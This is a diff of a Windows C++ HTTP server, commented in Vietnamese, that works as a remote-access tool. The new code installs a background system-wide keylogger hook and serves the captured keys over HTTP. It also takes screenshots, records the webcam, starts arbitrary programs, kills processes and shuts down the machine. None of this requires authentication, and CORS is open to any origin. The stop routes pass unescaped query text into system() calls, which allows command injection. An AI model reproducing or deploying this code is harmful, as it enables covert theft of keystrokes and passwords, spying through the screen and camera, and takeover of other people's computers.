@@ -1,24 +1,3 @@
-// Tên miền
-
-// - GET /                -> index page
-// - GET /apps        -> list configured apps (APPS dict)
-// - GET /apps/start?app=name  -> start app (by key in APPS)
-// - GET /apps/stop?app=name   -> stop app (by key in APPS)
-
-// - GET /processes        -> list running processes (name + pid)
-// - GET /processes/actions/start?path=... -> start arbitrary exe by path
-// - GET /processes/actions/stop?pid=1234  -> stop process by PID
-// - GET /processes/actions/stop?name=chrome.exe -> stop processes by name
-
-// - GET /keylogger            -> key capture page
-// - GET /keylogger/send?key=K -> receive key from client
-
-// - GET /screenshot      -> take screenshot, returns filename
-// - GET /webcam_rec      -> record 10 seconds from default webcam, returns filename
-
-// - GET /shutdown        -> shutdown machine (requires admin)
-// - GET /restart         -> restart machine (requires admin)
-
 #include <iostream>
 #include <thread>
 #include <winsock2.h>
@@ -29,410 +8,457 @@
 #include <map>
 #include <sstream>
 #include <algorithm>
+#include <vfw.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+//g++ all_in_one.cpp -o server.exe -lws2_32 -lgdi32 -lvfw32
+
+// Cấu hình
+const int PORT = 6969;
+const int BUFFER_SIZE = 4096;
 
 std::map<std::string, std::string> APPS = {
     {"notepad", "notepad.exe"},
     {"mspaint", "mspaint.exe"},
-    {"cmd", "cmd.exe"}
+    {"cmd", "cmd.exe"},
+    {"calc", "calc.exe"},
+    {"chrome", "chrome.exe"}
 };
 
-const int PORT = 6969;
-const int BUFFER_SIZE = 4096;
-
-bool is_running(const std::string& exe_name) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return false;
-    }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            std::string current_exe(pe.szExeFile);
-            
-            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::tolower);
-            std::string target_exe = exe_name;
-            std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::tolower);
-
-            if (current_exe == target_exe) {
-                CloseHandle(hSnapshot);
-                return true;
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return false;
-}
-
-int stop_app_by_exe(const std::string& exe_name) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return 0;
-    }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-    int count = 0;
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            std::string current_exe(pe.szExeFile);
-            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::tolower);
-            std::string target_exe = exe_name;
-            std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::tolower);
-
-            if (current_exe == target_exe) {
-                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                if (hProcess != NULL) {
-                    TerminateProcess(hProcess, 0);
-                    CloseHandle(hProcess);
-                    count++;
-                }
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return count;
-}
-
-
-std::string html_page(const std::string& body) {
-    std::string response = "HTTP/1.1 200 OK\r\n";
-    response += "Content-Type: text/html\r\n";
+// Hàm helper trả về HTTP Response có CORS header (quan trọng để JS gọi được)
+std::string http_response(const std::string& body, const std::string& status = "200 OK", const std::string& content_type = "text/html") {
+    std::string response = "HTTP/1.1 " + status + "\r\n";
+    response += "Content-Type: " + content_type + "\r\n";
+    response += "Access-Control-Allow-Origin: *\r\n"; // Cho phép mọi nguồn truy cập
+    response += "Access-Control-Allow-Methods: GET, POST\r\n";
     response += "Content-Length: " + std::to_string(body.length()) + "\r\n";
     response += "Connection: close\r\n\r\n";
     response += body;
     return response;
 }
 
-std::string redirect(const std::string& url = "/") {
-    std::string response = "HTTP/1.1 302 Found\r\n";
-    response += "Location: " + url + "\r\n";
-    response += "Content-Length: 0\r\n";
-    response += "\r\n";
-    return response;
+// =================== APPS ===================================
+
+bool is_running(const std::string& exe_name) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            std::string current_exe(pe.szExeFile);
+            std::string target_exe = exe_name;
+            // So sánh không phân biệt hoa thường
+            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::tolower);
+            std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::tolower);
+            if (current_exe == target_exe) {
+                CloseHandle(hSnapshot);
+                return true;
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    return false;
 }
 
-// ====================== LIST APPS ======================
-
+void start_app_sys(const std::string& exe_path) {
+    ShellExecuteA(NULL, "open", exe_path.c_str(), NULL, NULL, SW_SHOWNORMAL);
+}
 std::string list_apps() {
     std::string rows;
     for (const auto& pair : APPS) {
         std::string name = pair.first;
         std::string exe = pair.second;
         bool running = is_running(exe);
-        std::string status = running ? "running" : "stopped";
-        std::string action = running ? "Stop" : "Start";
-        std::string action_route = running ? "/apps/stop" : "/apps/start";
         
-        rows += "<li>" + name + " - " + status + " | ";
-        rows += " <a href='" + action_route + "?app=" + name + "'>" + action + "</a>";
+        // Trả về định dạng HTML cho list item
+        rows += "<li class='terminal-item'>";
+        rows += "<strong>" + name + "</strong> (" + exe + ")";
+        rows += running ? " <span style='color: #10b981'>[RUNNING]</span>" : " <span style='color: #64748b'>[STOPPED]</span>";
         rows += "</li>";
     }
-
-    return html_page("<h1>App List</h1><ul>" + rows + "</ul>");
+    return http_response(rows);
 }
+// ============== processess         =================================
+std::string list_processes() {
+    std::stringstream rows;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return http_response("Error snapshot", "500 Internal Server Error");
 
-void start_app(const std::string& app_name) {
-    if (APPS.count(app_name)) {
-        std::string exe = APPS[app_name];
-        
-        ShellExecuteA(NULL, "open", exe.c_str(), NULL, NULL, SW_SHOWNORMAL);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            rows << "<li><span style='color:#f59e0b'>" << pe.th32ProcessID << "</span> - " << pe.szExeFile << "</li>";
+        } while (Process32Next(hSnapshot, &pe));
     }
+    CloseHandle(hSnapshot);
+    return http_response(rows.str());
 }
 
-void stop_app(const std::string& app_name) {
-    if (APPS.count(app_name)) {
-        std::string exe = APPS[app_name];
-        stop_app_by_exe(exe);
+void stop_process_sys(const std::string& process_name) {
+    // Lệnh taskkill của Windows cho nhanh gọn
+    std::string cmd = "taskkill /F /IM " + process_name;
+    system(cmd.c_str());
+}
+
+// ==================== SYSTEM =========================
+std::string system_control(const std::string& action) {
+    if (action == "shutdown") {
+        system("shutdown /s /t 60"); // Shutdown sau 60s
+        return http_response("Shutting down in 60s...");
+    } else if (action == "restart") {
+        system("shutdown /r /t 60");
+        return http_response("Restarting in 60s...");
     }
+    return http_response("Unknown command", "400 Bad Request");
+}
+// ======================== KEYLOGGER ========================
+HHOOK hHook = NULL;
+std::string KEY_LOG_BUFFER = ""; // Bộ nhớ lưu phím
+
+std::string keylog_append(const std::string& key) {
+    if (key == "Enter") KEY_LOG_BUFFER += "\n";
+    else if (key == "Space") KEY_LOG_BUFFER += " ";
+    else if (key == "Backspace") { if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back(); }
+    else KEY_LOG_BUFFER += key;
+    
+    std::cout << "Key received: " << key << std::endl;
+    return http_response("OK");
 }
 
-std::map<std::string, std::string> parse_request_path(const std::string& request, std::string& route) {
-    std::map<std::string, std::string> query;
-    size_t start = request.find(' ');
-    size_t end = request.find(' ', start + 1);
-
-    if (start != std::string::npos && end != std::string::npos) {
-        std::string full_path = request.substr(start + 1, end - (start + 1));
-        
-        size_t query_pos = full_path.find('?');
-        if (query_pos != std::string::npos) {
-            route = full_path.substr(0, query_pos);
-            std::string query_str = full_path.substr(query_pos + 1);
+void AddKeyToLog(int key_stroke) {
+    if (key_stroke == 13) KEY_LOG_BUFFER += " [ENTER]\n";
+    else if (key_stroke == 8) {
+        if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back();
+    }
+    else if (key_stroke == 32) KEY_LOG_BUFFER += " ";
+    else if (key_stroke == VK_TAB) KEY_LOG_BUFFER += " [TAB] ";
+    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT) {} // Bỏ qua shift đơn lẻ
+    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL) {}
+    else if (key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU) {}
+    else if (key_stroke == VK_CAPITAL) KEY_LOG_BUFFER += " [CAPS] ";
+    else {
+        char key = (char)key_stroke;
+        // Kiểm tra xem có phải ký tự in được không
+        if (key >= 32 && key <= 126) {
+            // Xử lý Shift (đơn giản hóa: nếu CapsLock hoặc Shift đang giữ thì viết hoa)
+            bool shift = (GetKeyState(VK_SHIFT) & 0x8000);
+            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001);
             
-            size_t eq_pos = query_str.find('=');
-            if (eq_pos != std::string::npos) {
-                std::string key = query_str.substr(0, eq_pos);
-                std::string val = query_str.substr(eq_pos + 1);
-                query[key] = val;
+            if (!shift && !caps) {
+                key = tolower(key);
             }
+            KEY_LOG_BUFFER += key;
+        }
+    }
+    std::cout << "Key logged: " << key_stroke << std::endl; // Debug
+}
 
-        } else {
-            route = full_path;
+// Callback: Windows sẽ gọi hàm này mỗi khi có phím nhấn
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        if (wParam == WM_KEYDOWN) {
+            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
+            AddKeyToLog(pKey->vkCode);
+        }
+    }
+    return CallNextHookEx(hHook, nCode, wParam, lParam);
+}
+
+// Hàm chạy vòng lặp bắt phím (Chạy trên luồng riêng)
+void StartKeyloggerThread() {
+    // Cài đặt Hook loại WH_KEYBOARD_LL (Low Level)
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    
+    if (hHook == NULL) {
+        std::cerr << "Failed to install hook!" << std::endl;
+        return;
+    }
+
+    // Vòng lặp tin nhắn (Bắt buộc để Hook hoạt động)
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hHook);
+}
+
+std::map<std::string, std::string> parse_query(const std::string& path) {
+    std::map<std::string, std::string> query;
+    size_t q_pos = path.find('?');
+    if (q_pos != std::string::npos) {
+        std::string query_str = path.substr(q_pos + 1);
+        std::stringstream ss(query_str);
+        std::string segment;
+        while (std::getline(ss, segment, '&')) {
+            size_t eq_pos = segment.find('=');
+            if (eq_pos != std::string::npos) {
+                query[segment.substr(0, eq_pos)] = segment.substr(eq_pos + 1);
+            }
         }
     }
     return query;
 }
-// ====================== LIST PROCESSES ======================
 
-std::string list_processes() {
-    std::stringstream rows;
-    // Tạo snapshot của tất cả các tiến trình hiện tại
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
-    
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return html_page("<h1>Error: Khong the tao snapshot.</h1>");
-    }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            // Lấy PID (th32ProcessID) và Tên (szExeFile)
-            rows << "<li>" << pe.th32ProcessID << " - " << pe.szExeFile << "</li>\n";
-        } while (Process32Next(hSnapshot, &pe));
-    } else {
-        CloseHandle(hSnapshot);
-        return html_page("<h1>Error: Khong the liet ke tien trinh.</h1>");
-    }
-    
-
-    CloseHandle(hSnapshot);
-    return html_page("<h1>Processes</h1><ul>" + rows.str() + "</ul>");
+std::string get_route_path(const std::string& path) {
+    size_t q_pos = path.find('?');
+    if (q_pos != std::string::npos) return path.substr(0, q_pos);
+    return path;
 }
 
-std::string start_process(const std::string& path) {
+// ====================== LOGIC SCREENSHOT (Giữ nguyên) ======================
+std::string take_screenshot() {
+    int x1 = 0; int y1 = 0;
+    int x2 = GetSystemMetrics(SM_CXSCREEN);
+    int y2 = GetSystemMetrics(SM_CYSCREEN);
+    int width = x2 - x1;
+    int height = y2 - y1;
 
-    HINSTANCE result = ShellExecuteA(
-        NULL,       // handle cho cửa sổ cha (không có)
-        "open",     // hành động (mở)
-        path.c_str(), // Đường dẫn chương trình (exe, bat, cmd, etc.)
-        NULL,       // Tham số dòng lệnh
-        NULL,       // Thư mục làm việc
-        SW_SHOWNORMAL // Cách hiển thị cửa sổ
+    HDC hScreen = GetDC(NULL);
+    HDC hDC = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+    SelectObject(hDC, hBitmap);
+    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);
+
+    BITMAP bmpScreen;
+    GetObject(hBitmap, sizeof(BITMAP), &bmpScreen);
+    
+    BITMAPFILEHEADER bmfHeader;
+    BITMAPINFOHEADER bi;
+
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = bmpScreen.bmWidth;
+    bi.biHeight = bmpScreen.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = 32;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    
+    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
+    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
+    char *lpbitmap = (char *)GlobalLock(hDIB);
+    GetDIBits(hScreen, hBitmap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
+
+    std::string filename = "screenshot.bmp"; // Lưu đè vào file này
+    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
+    bmfHeader.bfSize = dwSizeofDIB;
+    bmfHeader.bfType = 0x4D42; // BM
+
+    DWORD dwBytesWritten = 0;
+    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
+    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
+    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
+
+    CloseHandle(hFile);
+    GlobalUnlock(hDIB);
+    GlobalFree(hDIB);
+    DeleteObject(hBitmap);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+
+    return filename;
+}
+
+// ====================== LOGIC WEBCAM  ======================
+void record_webcam_thread_func(std::string filename, int duration_ms) {
+    std::cout << "[Webcam] Dang khoi tao cua so..." << std::endl;
+
+    HWND hWndC = capCreateCaptureWindowA(
+        "Webcam Recorder", 
+        WS_VISIBLE | WS_OVERLAPPEDWINDOW, 
+        100, 100, 320, 240, 
+        NULL, 0
     );
 
-    if ((intptr_t)result <= 32) {
-        DWORD error = GetLastError();
-        return html_page("<h1>Error starting process: " + std::to_string(error) + "</h1>");
+    if (!hWndC) {
+        std::cerr << "[ERROR] Khong the tao cua so Webcam!" << std::endl;
+        return;
     }
 
-    return html_page("<h1>Started: " + path + "</h1>");
-}
+    bool isConnected = false;
 
-std::string stop_process_by_pid(const std::string& pid_str) {
-    DWORD pid = 0;
-    try {
-        pid = std::stoul(pid_str);
-    } catch (...) {
-        return html_page("<h1>Error: PID khong hop le.</h1>");
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid); 
-
-    if (hProcess == NULL) {
-        DWORD error = GetLastError();
-        if (error == ERROR_INVALID_PARAMETER) {
-            return html_page("<h1>Error: PID " + pid_str + " khong ton tai.</h1>");
+    // --- VÒNG LẶP QUÉT DRIVER (Từ 0 đến 9) ---
+    for (int driverIndex = 0; driverIndex < 10; driverIndex++) {
+        if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, driverIndex, 0)) {
+            std::cout << "[Webcam] Ket noi THANH CONG voi Driver index: " << driverIndex << std::endl;
+            isConnected = true;
+            break; // Tìm thấy rồi thì thoát vòng lặp
         }
-        return html_page("<h1>Error: Khong the mo process (" + std::to_string(error) + ").</h1>");
-    }
-    
-    if (!TerminateProcess(hProcess, 0)) {
-        DWORD error = GetLastError();
-        CloseHandle(hProcess);
-        return html_page("<h1>Error terminating process: " + std::to_string(error) + "</h1>");
     }
 
-    CloseHandle(hProcess);
-    return html_page("<h1>Terminated PID " + pid_str + "</h1>");
+    if (isConnected) {
+        // Cấu hình Preview
+        SendMessage(hWndC, WM_CAP_SET_SCALE, TRUE, 0);
+        SendMessage(hWndC, WM_CAP_SET_PREVIEWRATE, 66, 0);
+        SendMessage(hWndC, WM_CAP_SET_PREVIEW, TRUE, 0);
+
+        // Thiết lập file lưu (Dùng đường dẫn tuyệt đối nếu cần)
+        if (SendMessage(hWndC, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, (LPARAM)filename.c_str())) {
+             std::cout << "[Webcam] File save location: " << filename << std::endl;
+        }
+
+        CAPTUREPARMS CaptureParms;
+        SendMessage(hWndC, WM_CAP_GET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);
+
+        CaptureParms.dwRequestMicroSecPerFrame = (1000000 / 15); // 15 FPS
+        CaptureParms.fYield = TRUE; 
+        CaptureParms.fAbortLeftMouse = FALSE;
+        CaptureParms.fAbortRightMouse = FALSE;
+        CaptureParms.fMakeUserHitOKToCapture = FALSE;
+        CaptureParms.fCaptureAudio = FALSE; 
+        CaptureParms.fLimitEnabled = TRUE;
+        CaptureParms.wTimeLimit = duration_ms / 1000;
+
+        SendMessage(hWndC, WM_CAP_SET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);
+
+        std::cout << "[Webcam] Dang quay (" << duration_ms/1000 << "s)..." << std::endl;
+        
+        if (SendMessage(hWndC, WM_CAP_SEQUENCE, 0, 0)) {
+            std::cout << "[Webcam] Xong! File da duoc tao." << std::endl;
+        } else {
+            std::cerr << "[ERROR] Loi trong qua trinh ghi file." << std::endl;
+        }
+
+        SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
+    } 
+    else {
+        // Nếu quét từ 0-9 mà vẫn không được
+        std::cerr << "[CRITICAL ERROR] Khong tim thay bat ky Webcam nao (Index 0-9)!" << std::endl;
+        std::cerr << "Loi khuyen: Kiem tra quyen Privacy hoac Driver." << std::endl;
+    }
+
+    DestroyWindow(hWndC);
 }
 
-std::string stop_process_by_name(const std::string& name) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return html_page("<h1>Error: Khong the tao snapshot.</h1>");
-    }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-    int count = 0;
-
-    std::string lower_name = name;
-    std::transform(lower_name.begin(), lower_name.end(), lower_name.begin(), ::tolower);
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            std::string current_exe(pe.szExeFile);
-            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::tolower);
-
-            if (current_exe == lower_name) {
-                // Giong nhu stop_process_by_pid, nhung su dung PID cua tien trinh hien tai
-                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                if (hProcess != NULL) {
-                    if (TerminateProcess(hProcess, 0)) {
-                        count++;
-                    }
-                    CloseHandle(hProcess);
-                }
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return html_page("<h1>Terminated " + std::to_string(count) + " processes named " + name + "</h1>");
+std::string start_webcam_recording(int duration_sec) {
+    std::string filename = "webcam_" + std::to_string(duration_sec) + "s.avi";
+    // Chạy thread riêng để không treo server
+    std::thread t(record_webcam_thread_func, filename, duration_sec * 1000);
+    t.detach(); 
+    return filename;
 }
 
-// ====================== KeyLogger ======================
-std::string KEY_LOG = "";
-
-std::string keylog_control() {
-    std::string body = R"(
-        <h1>Key Logger (Client-side)</h1>
-        <p>Typing anything and data will be sent to server!</p>
-
-        <script>
-            document.addEventListener("keydown", function(e) {
-                fetch("/keylogger/send?key=" + encodeURIComponent(e.key));
-            });
-        </script>
-
-        <p>Keys are being sent to server...</p>
-    )";
-
-    return html_page(body);
-}
-
-std::string keylog_receive(const std::map<std::string, std::string>& query) {
-    if (!query.count("key")) {
-        return html_page("<h1>No key</h1>");
-    }
-
-    std::string key = query.at("key");
-
-    // Xử lý các phím đặc biệt cho dễ đọc
-    if (key == "Enter") KEY_LOG += "\n";
-    else if (key == "Space") KEY_LOG += " ";
-    else if (key == "Backspace") {
-        if (!KEY_LOG.empty()) KEY_LOG.pop_back();
-    }
-    else if (key.length() == 1) {
-        KEY_LOG += key;
-    } else {
-        KEY_LOG += "[" + key + "]";
-    }
-
-    std::cout << "[KEY_LOG] " << KEY_LOG << std::endl;
-
-    return html_page("<h1>OK</h1>");
-}
-
-// ====================== SCREENSHOT ======================
-// ====================== WEBCAM REC 10S ======================
-// ====================== SHUTDOWN/RESTART ======================
-
-// ====================== CHƯƠNG TRÌNH CHÍNH ======================
 
 int main() {
-    // 1. Khởi tạo Winsock
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "WSAStartup failed.\n";
-        return 1;
-    }
-
-    // 2. Tạo socket
-    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (server_fd == INVALID_SOCKET) {
-        std::cerr << "socket failed with error: " << WSAGetLastError() << "\n";
-        WSACleanup();
-        return 1;
-    }
-
-    // 3. Bind (gán địa chỉ)
-    sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(PORT);
-    server_addr.sin_addr.s_addr = INADDR_ANY;
-
-    if (bind(server_fd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        std::cerr << "Bind failed with error: " << WSAGetLastError() << "\n";
-        closesocket(server_fd);
-        WSACleanup();
-        return 1;
-    }
-
-    // 4. Listen
-    if (listen(server_fd, 5) == SOCKET_ERROR) {
-        std::cerr << "Listen failed with error: " << WSAGetLastError() << "\n";
-        closesocket(server_fd);
-        WSACleanup();
-        return 1;
-    }
-
-    std::cout << "Server running at http://localhost:" << PORT << "\n";
     
-    // 5. Vòng lặp Accept và Xử lý
+    std::thread loggerThread(StartKeyloggerThread);
+    loggerThread.detach();
+
+
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in address;
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(PORT);
+
+    bind(server_fd, (sockaddr*)&address, sizeof(address));
+    listen(server_fd, 5);
+
+    std::cout << "Server running on port " << PORT << "...\n";
+    std::cout << "Keylogger is active in background...\n";
+
     while (true) {
         SOCKET client_socket = accept(server_fd, NULL, NULL);
-        if (client_socket == INVALID_SOCKET) {
-            std::cerr << "Accept failed with error: " << WSAGetLastError() << "\n";
+        if (client_socket == INVALID_SOCKET) continue;
+
+        char buffer[BUFFER_SIZE] = {0};
+        recv(client_socket, buffer, BUFFER_SIZE, 0);
+        
+        std::string request(buffer);
+        // Lấy dòng đầu tiên: GET /path HTTP/1.1
+        std::stringstream ss(request);
+        std::string method, full_path;
+        ss >> method >> full_path;
+
+        if (method.empty()) {
+            closesocket(client_socket);
             continue;
         }
 
-        char buffer[BUFFER_SIZE];
-        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
+        std::string route = get_route_path(full_path);
+        std::map<std::string, std::string> query = parse_query(full_path);
+        std::string response;
 
-        if (bytes_received > 0) {
-            buffer[bytes_received] = '\0';
-            std::string request(buffer);
-            std::cout << request << "\n";
+        std::cout << "Request: " << route << std::endl;
 
-            std::string route;
-            std::map<std::string, std::string> query = parse_request_path(request, route);
-            std::string response;
-
-            if (route == "/") {
-                response = html_page("<h1>WinSock C++ App Controller</h1>"
-                                     "<ul>"
-                                     "<li><a href='/apps'>List apps</a></li>"
-                                     "<li><a href='/processes'>List processes</a></li>"
-                                     "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
-                                     "<li><a href='/keylogger'>Keylogger</a></li>"
-                                     "<li><a href='/screenshoot'>Screenshoot</a></li>"
-                                     "<li><a href='/webcam_rec'>Record webcam 10s</a></li>"
-                                     "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
-                                     "<li><a href='/restart'>Restart</a> (admin)</li>"
-                                     "</ul>");
-            } else if (route == "/apps") {
-                response = list_apps();
-            } else if (route == "/apps/start") {
-                std::string app_name = query.count("app") ? query["app"] : "";
-                start_app(app_name);
-                response = redirect("/apps");
-            } else if (route == "/apps/stop") {
-                std::string app_name = query.count("app") ? query["app"] : "";
-                stop_app(app_name);
-                response = redirect("/apps");
-            } else if (route == "/processes") {
-                response = list_processes();
-            } else if (route == "/keylogger") {
-                response = keylog_control();
-            } else if (route == "/keylogger/send") {
-                response = keylog_receive(query);
-            } else {
-                response = html_page("<h1>404 Not Found</h1>");
-            }
-
-            send(client_socket, response.c_str(), response.length(), 0);
+        // --- ROUTER ---
+        if (route == "/ping") {
+            response = http_response("pong");
+        }
+        else if (route == "/apps") {
+            response = list_apps();
+        }
+        else if (route == "/apps/start") {
+            std::string name = query["name"];
+            if (APPS.count(name)) start_app_sys(APPS[name]);
+            else start_app_sys(name); // Thử mở trực tiếp nếu không có trong dict
+            response = http_response("Started " + name);
+        }
+        else if (route == "/apps/stop") {
+            // Logic dừng app theo tên định nghĩa trong APPS
+            std::string name = query["name"];
+            if (APPS.count(name)) stop_process_sys(APPS[name]);
+            else stop_process_sys(name + ".exe");
+            response = http_response("Stopped " + name);
+        }
+        else if (route == "/processes") {
+            response = list_processes();
+        }
+        else if (route == "/processes/stop") {
+            // Nhận PID hoặc tên
+            std::string target = query["name"]; // Dùng param 'name' cho thống nhất
+            stop_process_sys(target); 
+            response = http_response("Kill command sent to " + target);
+        }
+        else if (route == "/keylogger/send") {
+            response = keylog_append(query["key"]);
+        }
+        else if (route == "/keylogger/get") {
+            response = http_response(KEY_LOG_BUFFER);
+        }
+        else if (route == "/shutdown") {
+            response = system_control("shutdown");
+        }
+        else if (route == "/restart") {
+            response = system_control("restart");
         }
 
+        else if (route == "/screenshot") {
+            std::string filename = take_screenshot();
+            response = http_response("Screenshot saved as: " + filename);
+        }
+
+        // --- ROUTE QUAY WEBCAM ---
+        else if (route == "/webcam") {
+            int duration = 10;
+            if (query.find("duration") != query.end()) {
+                try { duration = std::stoi(query["duration"]); } catch(...) {}
+            }
+
+            std::cout << "Recording webcam for " << duration << "s..." << std::endl;
+            std::string filename = start_webcam_recording(duration);
+            response = http_response("Started recording webcam. File: " + filename);
+        }
+
+
+        else {
+            response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
+        }
+
+        send(client_socket, response.c_str(), response.length(), 0);
         closesocket(client_socket);
     }
 
